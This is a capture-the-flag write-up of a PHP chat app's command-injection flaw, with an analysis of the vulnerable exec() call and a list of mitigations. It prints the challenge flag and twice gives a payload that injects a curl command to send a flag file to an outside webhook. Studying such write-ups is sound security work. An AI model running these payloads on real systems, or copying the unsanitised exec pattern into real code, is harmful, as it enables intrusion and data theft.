# Challenge Name:
lets chat!

## Description:
lets chat using this web!

## Category:
Web

## File:
./dist.zip

## Flag:
`STORM{command_injection_?_eefdaace08}`

## Points:
500

## Author:
k.eii

## Vulnerability Analysis
**Vulnerability Type:** Command Injection

**Vulnerable File:** `src/app/sendMessage.php`

**Vulnerable Code:**
```php
$messageSent = "echo '$message' | mail -s 'Message from " . $_SESSION['user'] . "' $recipient";
exec($messageSent);
```

**Explanation:**
User input (`$recipient` and `$message`) is directly inserted into a shell command and executed with `exec()`. The blacklist only blocks a few keywords, but does not prevent command separators like `;` or `&&`. This allows attackers to inject arbitrary commands.

**Exploit Example:**
The following payload (from the PoC) injects a new command to exfiltrate the flag:
```
ayam1; curl -X POST -d "$(cat /var/flag.txt)" https://webhook.site/823dde1f-c5b5-42f5-b4b6-83dab47080bc #
```

**Mitigation:**
- Never pass unsanitized user input to shell commands.
- Use parameterized APIs or proper escaping (e.g., `escapeshellarg`).
- Prefer not to use shell execution for user data at all.

## PoC
```
ayam1; curl -X POST -d \"$(cat /var/flag.txt)\" https://webhook.site/823dde1f-c5b5-42f5-b4b6-83dab47080bc #"
```